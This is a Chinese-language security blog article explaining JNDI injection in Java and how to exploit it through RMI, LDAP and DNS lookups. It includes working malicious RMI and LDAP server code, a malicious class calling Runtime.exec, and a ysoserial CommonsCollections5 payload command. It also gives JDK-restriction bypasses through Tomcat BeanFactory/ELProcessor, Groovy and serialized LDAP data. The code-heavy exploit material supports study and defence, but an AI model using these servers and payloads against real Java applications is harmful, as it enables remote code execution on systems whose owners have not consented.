> **原文链接**: https://mp.weixin.qq.com/s?__biz=MjM5MjEyMTcyMQ==&mid=2651037760&idx=1&sn=84b1539eb7b06d869eb58fc0785490fb

#  详解JNDI注入攻击原理和利用方式  
NEURON  SAINTSEC   2025-06-23 10:04  
  
JNDI  
  
简介  
  
  
  
JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdwvSyEfYIKENqiamKnQKrZTicMx0LgIicic2fy4Gcw7zKic64a7catHicdqM0g/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdwvSyEfYIKENqiamKnQKrZTicMx0LgIicic2fy4Gcw7zKic64a7catHicdqM0g/640?wx_fmt=png "")  
  
上面提到了命名服务与目录服务，它们又是什么呢?  
  
命名服务：命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务。  
  
  
目录服务：目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象，这么说可能不太好理解，我们举个例子：比如你要在某个学校里里找某个人，那么会通过：年级->班级->姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务。  
  
  
  
  
JNDI  
  
注入复现  
  
  
  
  
代码中定义了URL变量，URL 变量攻击者可控，并定义了一个 LDAP 协议服务， 使用 lookup() 函数进行远程获取并执行恶意的 Exploit 类。  

```
import javax.naming.InitialContext;
import javax.naming.NamingException;


publicclassjndi{
    publicstaticvoidmain(String[] args)throws NamingException {
        String url = &#34;rmi://127.0.0.1:1099/Exploit&#34;;  
        InitialContext initialContext = new InitialContext();// 得到初始目录环境的一个引用
        initialContext.lookup(url); // 获取指定的远程对象
    }
}
```

  
JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：  
  
<table><tbody><tr><td data-colwidth="15.0000%" width="15.0000%" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgb(62, 62, 62) rgb(242, 251, 255) rgb(62, 62, 62) rgb(62, 62, 62);border-top-style: none;border-bottom-style: none;border-left-style: none;background-color: rgb(137, 202, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 15px;margin-bottom: 15px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(255, 255, 255);"><p style="text-align: center;"><strong><span leaf="">协议</span></strong></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgb(62, 62, 62) rgb(242, 251, 255) rgb(62, 62, 62) rgb(62, 62, 62);border-top-style: none;border-bottom-style: none;border-left-style: none;background-color: rgb(137, 202, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 15px;margin-bottom: 15px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(255, 255, 255);"><p style="text-align: center;"><strong><span leaf="">JDK6</span></strong></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgb(62, 62, 62) rgb(242, 251, 255) rgb(62, 62, 62) rgb(62, 62, 62);border-top-style: none;border-bottom-style: none;border-left-style: none;background-color: rgb(137, 202, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 15px;margin-bottom: 15px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(255, 255, 255);"><p style="text-align: center;"><strong><span leaf="">JDK7</span></strong></p></section></section></td><td data-colwidth="24.0000%" width="24.0000%" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgb(62, 62, 62) rgb(242, 251, 255) rgb(62, 62, 62) rgb(62, 62, 62);border-top-style: none;border-bottom-style: none;border-left-style: none;background-color: rgb(137, 202, 255);line-height: 1;padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 15px;margin-bottom: 15px;"><section style="text-align: center;padding-right: 5px;padding-left: 5px;color: rgb(255, 255, 255);"><p><strong><span leaf="">JDK8</span></strong></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-color: rgb(62, 62, 62) rgb(242, 251, 255) rgb(62, 62, 62) rgb(62, 62, 62);border-top-style: none;border-bottom-style: none;border-left-style: none;background-color: rgb(137, 202, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 15px;margin-bottom: 15px;"><section style="text-align: center;padding-right: 5px;padding-left: 5px;color: rgb(255, 255, 255);"><p><strong><span leaf="">JDK11</span></strong></p></section></section></td></tr><tr><td data-colwidth="15.0000%" width="15.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><strong><span leaf="">LADP</span></strong></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">6u211以下</span></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">7u201以下</span></p></section></section></td><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">8u191以下</span></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">11.0.1以下</span></p></section></section></td></tr><tr><td data-colwidth="15.0000%" width="15.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><strong><span leaf="">RMI</span></strong></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">6u132以下</span></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">7u122以下</span></p></section></section></td><td data-colwidth="24.0000%" width="24.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">8u113以下</span></p></section></section></td><td data-colwidth="20.0000%" width="20.0000%" style="border-width: 0px;border-color: rgb(62, 62, 62) rgb(137, 202, 255) rgb(137, 202, 255) rgb(62, 62, 62);background-color: rgb(242, 251, 255);padding: 0px;"><section powered-by="xiumi.us" style="margin-top: 5px;margin-bottom: 5px;"><section style="padding-right: 5px;padding-left: 5px;color: rgb(137, 202, 255);font-size: 14px;"><p style="text-align: center;"><span leaf="">无</span></p></section></section></td></tr></tbody></table>  
  
  
2.1  
  
   
JNDI+RMI  
  
通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个Reference对象，Reference对象中指定从远程加载构造的恶意Factory类，客户端在进行lookup的时候，会从远程动态加载攻击者构造的恶意Factory类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。  
  
  
javax.naming.Reference构造方法为：Reference(String className, String factory, String factoryLocation)  
  
className - 远程加载时所使用的类名  
  
classFactory - 加载的class中需要实例化类的名称  
  
classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议  
  
  
因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。  
  
  
服务端代码如下：  

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


publicclassRMIServer{


    publicstaticvoidmain(String[] args)throws Exception{
        Registry registry= LocateRegistry.createRegistry(7777);
        Reference reference = new Reference(&#34;test&#34;, &#34;test&#34;, &#34;http://localhost/&#34;);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind(&#34;calc&#34;, wrapper);


    }
}
```

  
恶意代码（test.class），将其编译好放到可访问的web服务器。  

```
import java.lang.Runtime;


publicclasstest{
publictest()throws Exception{
        Runtime.getRuntime().exec(&#34;calc&#34;);
    }
}
```

  
当客户端通过  
InitialContext().lookup("rmi:// 127.0.0.1  
:7777/calc")   
获取远程对象时，会执行我们的恶意代码。  

```
package demo;


import javax.naming.InitialContext;


publicclassJNDI_Test{
    publicstaticvoidmain(String[] args)throws Exception{
        new InitialContext().lookup(&#34;rmi://127.0.0.1:7777/calc&#34;);
    }
}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdwVXd12uHKpcgDib53EPzdBxzuQHibooCfficiaDTJCmVYGoUmRzHVB8Yr7w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdwVXd12uHKpcgDib53EPzdBxzuQHibooCfficiaDTJCmVYGoUmRzHVB8Yr7w/640?wx_fmt=png "")  
  
对于这种利用方式Java在其JDK 6u132、7u122、8u113中进行了限制，  

```
com.sun.jndi.rmi.object.trustURLCodebase默认值变为false


static {
    PrivilegedAction var0 = () -> {
        return System.getProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;false&#34;);
    };
    String var1 = (String)AccessController.doPrivileged(var0);
    trustURLCodebase = &#34;true&#34;.equalsIgnoreCase(var1);
}
```

  
如果从远程加载则会抛出异常  

```
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
    thrownew ConfigurationException(&#34;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&#34;);
}
```

  
  
2.2  
  
   
JNDI+LDAP  
  
JNDI也可以通过LDAP协议加载远程的Reference工厂类。  
  
起一个LDAP服务，代码改自marshalsec  

```
package demo;


import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;


import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;


import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;


publicclassLDAPRefServer{


    privatestaticfinal String LDAP_BASE = &#34;dc=example,dc=com&#34;;


    publicstaticvoidmain( String[] tmp_args ){
        String[] args=new String[]{&#34;http://192.168.43.88/#test&#34;};
        int port = 7777;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &#34;listen&#34;, //$NON-NLS-1$
                    InetAddress.getByName(&#34;0.0.0.0&#34;), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));


            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println(&#34;Listening on 0.0.0.0:&#34; + port); //$NON-NLS-1$
            ds.startListening();


        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }


    privatestaticclassOperationInterceptorextendsInMemoryOperationInterceptor{


        private URL codebase;


        publicOperationInterceptor( URL cb ){
            this.codebase = cb;
        }


        @Override
        publicvoidprocessSearchResult( InMemoryInterceptedSearchResult result ){
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }


        protectedvoidsendResult( InMemoryInterceptedSearchResult result, String base, Entry e )throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&#34;.class&#34;));
            System.out.println(&#34;Send LDAP reference result for &#34; + base + &#34; redirecting to &#34; + turl);
            e.addAttribute(&#34;javaClassName&#34;, &#34;foo&#34;);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute(&#34;javaCodeBase&#34;, cbstring);
            e.addAttribute(&#34;objectClass&#34;, &#34;javaNamingReference&#34;); //$NON-NLS-1$
            e.addAttribute(&#34;javaFactory&#34;, this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

  
服务端需要添加如下依赖：  

```
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.1</version>
</dependency>
```

  
客户端  

```
package demo;


import javax.naming.InitialContext;


publicclassJNDI_Test{
    publicstaticvoidmain(String[] args)throws Exception{
        Object object=new InitialContext().lookup(&#34;ldap://127.0.0.1:7777/calc&#34;);
    }
}
```

  
  
2.3  
  
   
DNS协议  
  
DNS主要是为了快速测试是否存在漏洞点。  

```
import javax.naming.InitialContext;
import javax.naming.NamingException;
publicclassClient{
    publicstaticvoidmain(String[] args)throws NamingException{
        String url = &#34;dns://test.bmg6g1.dnslog.cn&#34;;
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdw6XTzo0O1FaciaULmdzSibafqibibnqTVVacFpKfA4Nt1j6flEYHnQ3Ot2g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSKxRBKOEibsGsRZpeBsrcdw6XTzo0O1FaciaULmdzSibafqibibnqTVVacFpKfA4Nt1j6flEYHnQ3Ot2g/640?wx_fmt=png "")  
  
  
  
JDK高版本  
  
限制绕过  
  
  
  
  
3.1  
  
   
RMI高版本绕过  
  
在JDK 6u132, JDK 7u122, JDK 8u121版本开始com.sun.jndi.rmi.object.trustURLCodebase、  
  
com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。所以原本的远程加载恶意类的方式已经失效，不过并没有限制从本地进行加载类文件，比如org.apache.naming.factory.BeanFactory。  
  
3.1.1 利用tomcat8的类  
  
利用类为org.apache.naming.factory. BeanFactory，针对 RMI 利用的检查方式中最关键的就是 if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase)。  
  
如果 FactoryClassLocation 为空，那么就会进入 NamingManager.getObjectInstance，在此方法会调用 Reference 中的ObjectFactory。  
  
因此绕过思路为在目标 classpath 中寻找实现 ObjectFactory 接口的类。在 Tomcat 中有一处可以利用的符合条件的类org.apache.naming.factory. BeanFactory，在此类中会获取 Reference 中的forceString 得到其中的值之后会判断是否包含等号，如果包含则用等号分割，将前一半当做方法名，后一半当做 Hashmap 中的 key。如果不包含等号则方法名变成 set开头。值得注意的是此方法中已经指定了参数类型为 String。后面将会利用反射执行前面所提到的方法。因此需要找到使用了 String 作为参数，并且能 RCE的方法。在javax.el.ELProcessor 中的 eval 方法就很合适。  
  
pom.xml添加相关依赖  

```
<dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>8.5.0</version>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat.embed</groupId>
        <artifactId>tomcat-embed-el</artifactId>
        <version>8.5.15</version>
    </dependency>
```

  
启动服务端代码：  

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import org.apache.naming.ResourceRef;


publicclassHdjkserver{
    publicstaticvoidmain(String[] args)throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef(&#34;javax.el.ELProcessor&#34;, (String)null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, (String)null);
        resourceRef.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=eval&#34;));
        resourceRef.add(new StringRefAddr(&#34;a&#34;, &#34;Runtime.getRuntime().exec(\&#34;open -a calculator\&#34;)&#34;));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(resourceRef);
        registry.bind(&#34;exp&#34;, refObjWrapper);
        System.out.println(&#34;Creating evil RMI registry on port 1099&#34;);
    }
}
```

  
client端代码:  

```
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;


publicclassClient {
    publicstaticvoidmain(String[] args) throws NamingException {
            String uri = &#34;rmi://127.0.0.1:1099/exp&#34;;
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}


```

  
3.1.2 依赖groovy任意版本的类  
  
以版本1.5为例，添加pom.xml相关依赖。  

```
   <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>1.5.0</version>
        </dependency>
```

  
服务端代码  

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;


import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


publicclassExecByGroovy{
    publicstaticvoidmain(String[] args)throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef(&#34;groovy.lang.GroovyShell&#34;, null, &#34;&#34;, &#34;&#34;, true,&#34;org.apache.naming.factory.BeanFactory&#34;,null);
        ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;x=evaluate&#34;));
        String script = String.format(&#34;'%s'.execute()&#34;, &#34;open -a calculator&#34;); //commandGenerator.getBase64CommandTpl());
        ref.add(new StringRefAddr(&#34;x&#34;,script));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
        registry.bind(&#34;exp&#34;, refObjWrapper);
        System.out.println(&#34;Creating evil RMI registry on port 1099&#34;);
    }
}
```

  
  
3.2  
  
   
LDAP高版本绕过  
  
3.2.1 Base64字节码加载  
  
JDK 6u211，7u201，8u191, 11.0.1开始 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，导致LDAP远程代码攻击方式开始失效。  
  
这里可以利用javaSerializedData属性，当javaSerializedData属性的value值不为空时，会对该值进行反序列化处理，当本地存在反序列化利用链时，即可触发。  
  
如果目标存在CC链利用链，先使用ysoserial.jar生成CC链的poc  

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &#34;open -a calculator.app&#34; > poc.txt
cat poc.txt|base64 >base64.txt
```

  
转换为base64编码后放到如下服务端代码里,代码的String[]字符串里面ip不影响payload执行。  

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


publicclassLDAPServer{
    privatestaticfinal String LDAP_BASE = &#34;dc=example,dc=com&#34;;


    publicstaticvoidmain( String[] tmp_args )throws Exception{
        String[] args=new String[]{&#34;http://localhost/#Evail&#34;}; 
        int port = 6666;


        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                &#34;listen&#34;, //$NON-NLS-1$
                InetAddress.getByName(&#34;0.0.0.0&#34;), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));


        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println(&#34;Listening on 0.0.0.0:&#34; + port); //$NON-NLS-1$
        ds.startListening();
    }


    privatestaticclassOperationInterceptorextendsInMemoryOperationInterceptor{


        private URL codebase;


        publicOperationInterceptor( URL cb ){
            this.codebase = cb;
        }


        @Override
        publicvoidprocessSearchResult( InMemoryInterceptedSearchResult result ){
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }


        protectedvoidsendResult( InMemoryInterceptedSearchResult result, String base, Entry e )throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&#34;.class&#34;));
            System.out.println(&#34;Send LDAP reference result for &#34; + base + &#34; redirecting to &#34; + turl);
            e.addAttribute(&#34;javaClassName&#34;, &#34;foo&#34;);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }


            e.addAttribute(&#34;javaSerializedData&#34;, Base64.decode(&#34;base64编码的payload&#34;));


            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

  
客户端代码  

```
import javax.naming.InitialContext;
import javax.naming.Context;
import javax.naming.NamingException;
publicclassJNDI_Test{
    publicstaticvoidmain(String[] args)throws NamingException {
        String uri = &#34;ldap://127.0.0.1:6666/exp&#34;;
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```

  
  
参考链接：  
  
1.   
https://xz.aliyun.com/t/12277  
  
2.   
https://xz.aliyun.com/t/10035  
  
  
